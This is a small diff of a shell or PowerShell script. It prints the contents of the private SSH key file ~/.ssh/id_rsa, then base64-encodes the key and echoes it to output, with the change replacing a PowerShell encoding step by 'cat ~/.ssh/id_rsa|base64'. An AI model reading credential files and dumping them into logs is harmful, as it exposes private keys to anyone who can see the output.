@@ -9,9 +9,10 @@
   echo "We have a private key"
   cat ~/.ssh/id_rsa
 
-  $Text = cat ~/.ssh/id_rsa
-  $Bytes = [System.Text.Encoding]::UTF8.GetBytes($Text)
-  $EncodedText = [Convert]::ToBase64String($Bytes)
+  # $Text = cat ~/.ssh/id_rsa
+  # $Bytes = [System.Text.Encoding]::UTF8.GetBytes($Text)
+  # $EncodedText = [Convert]::ToBase64String($Bytes)
+  $EncodedText = cat ~/.ssh/id_rsa|base64
   
   echo "We have base64 encoded 1"
   echo $EncodedText
